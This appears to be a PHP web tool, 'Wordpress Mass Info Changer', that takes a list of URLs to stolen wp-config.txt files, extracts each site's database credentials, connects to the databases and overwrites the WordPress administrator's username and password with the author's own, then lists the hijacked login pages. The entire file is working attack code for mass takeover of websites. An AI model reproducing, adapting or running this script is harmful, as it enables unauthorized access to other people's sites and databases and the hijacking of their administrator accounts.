<html>
<head>
<meta content="text/html; charset=ISO-8859-1"
http-equiv="content-type">
<title>.:! Magico Wordpress Mass Info Changer!:.</title>
</head>
<body style="background-color: black; color: rgb(0, 0, 0);"
alink="#ee0000" link="#0000ee" vlink="#551a8b">
<div style="text-align: left;"><span
style="color: rgb(102, 102, 102); font-weight: bold;">.:!~@# </span><span
style="font-weight: bold; color: rgb(0, 153, 0);">Wordpress Config's
Mass Info Changer</span><span
style="color: rgb(51, 204, 0); font-weight: bold;"> <span
style="color: rgb(51, 51, 255);"></span><span
style="color: rgb(102, 102, 102);">#@~!:.</span></span><br>
<span style="color: rgb(51, 204, 0); font-weight: bold;"><span
style="color: rgb(153, 153, 0);"></span></span> &nbsp;&nbsp;
&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; <span
style="color: rgb(102, 102, 102);">&nbsp; .:</span><span
style="color: rgb(102, 102, 102); font-weight: bold;"> BY: <a
href="https://www.facebook.com/ElKiller.2013">Elmagico</a></span><span
style="color: rgb(102, 102, 102);"> :.</span><br>
<span style="color: rgb(51, 204, 0); font-weight: bold;"><span
style="color: rgb(153, 153, 0);"><img
style="width: 306px; height: 152px;" alt=""
src="http://localhost/x.jpg"></span></span>

<span style="color: rgb(0, 153, 0); font-weight: bold;">
<?php
set_time_limit(0);
error_reporting(0);
echo'<form method="post">
<textarea name="sites" cols="70" rows="12" placeholder="http://www.site.com/sym/wp-config.txt"></textarea><br>
<input name="change" value="Change" type="submit"/>
</form>';
///////////////////////////////
$sites =$_POST['sites'];
$change = $_POST['change'];
//////////////////////////////////////////////////////////////////////
if(isset($change) && $sites != ""){
$sits = explode("\r\n",$sites);

foreach($sits as $site){
	$site = trim($site);
	$cn = @file_get_contents($site);
		if(preg_match("#DB_USER#i", $cn)){
		preg_match("#'DB_HOST', '(.*?)'#i", $cn, $DB_HOST);
		preg_match("#'DB_USER', '(.*?)'#i", $cn, $DB_USER);
		preg_match("#'DB_PASSWORD', '(.*?)'#i", $cn, $DB_PASSWORD);
		preg_match("#'DB_NAME', '(.*?)'#i", $cn, $DB_NAME);
		preg_match("#table_prefix  = '(.*)'#i", $cn, $prefix);
		
		
		$con = @mysql_connect($DB_HOST[1],$DB_USER[1],$DB_PASSWORD[1]);
			if($con){
			$db = @mysql_select_db($DB_NAME[1],$con);
				if($db){
				$q = @mysql_query("UPDATE ".$prefix[1]."users SET `user_login` ='magico' WHERE ID = 1");
				$q = @mysql_query("UPDATE ".$prefix[1]."users SET `user_pass` ='ad288af4a9ad4a55a9a939e984f23a18' WHERE ID = 1");
					
						if($q){
						
						$qurl = @mysql_query("SELECT * from  ".$prefix[1]."options WHERE option_name='siteurl'");
						$data = @mysql_fetch_array($qurl);
						$wpurl = $data["option_value"];

						echo "----------------------------------------------------------------------------------------------------------------------<br>";
						preg_match('#http://(.*)/(.*)\.txt#',$site,$txt);
						echo "<span style=\"color: rgb(0, 153, 0); font-weight: bold;\">[#] </span><span style=\"color: rgb(51, 204, 0); font-weight: bold;\">$txt[2] :</span>"."  "."[User]= <span style=\"color: rgb(153, 153, 0); font-weight: bold;\">magico </span>[Pass]= <span style=\"color: rgb(153, 153, 0); font-weight: bold;\">xmagico </span>:"."  "."[site]<span style=\"color: rgb(204, 51, 204); font-weight: bold;\"> <a href=\"$wpurl/wp-login.php\">$wpurl/wp-login.php</a></span><br>";

						}//end if
						else{

							$qurl = @mysql_query("SELECT * from  `wp_options` WHERE option_name='siteurl'");
							$data = @mysql_fetch_array($qurl);
							$wpurl = $data["option_value"];						
						
						
							echo 
"----------------------------------------------------------------------------------------------------------------------<br>";
							preg_match('#http://(.*)/(.*)\.txt#',$site,$txt);
							echo "-----------------------------------------------------------------------------------------------<br>";
							echo"<span style=\"color: red; font-weight: bold;\">[!] $txt[2] : Error query"."  " ."</span><br>";
							}
						
						}/*end if*/else{
							preg_match('#http://(.*)/(.*)\.txt#',$site,$txt7);
							echo "-----------------------------------------------------------------------------------------------<br>";
							echo"<span style=\"color: red; font-weight: bold;\">[!] $txt7[2]: ERRoR query</span><br>";}
						
							
				}/*end if*/else{
					preg_match('#http://(.*)/(.*)\.txt#',$site,$txt6);
					echo "-----------------------------------------------------------------------------------------------<br>";
					echo "<span style=\"color: red; font-weight: bold;\">[!] $txt6[2] : [!]can't select the database</span><br>";}
				
			}/*end if*/else{ 
			preg_match('#http://(.*)/(.*)\.txt#',$site,$txt0);
			echo "-----------------------------------------------------------------------------------------------<br>";
			echo "<span style=\"color: red; font-weight: bold;\">[!] $txt0[2] : [!]can't connect to the database</span><br>";}
/////////////////////////////////////	
}//end foreach
} //endif
?>
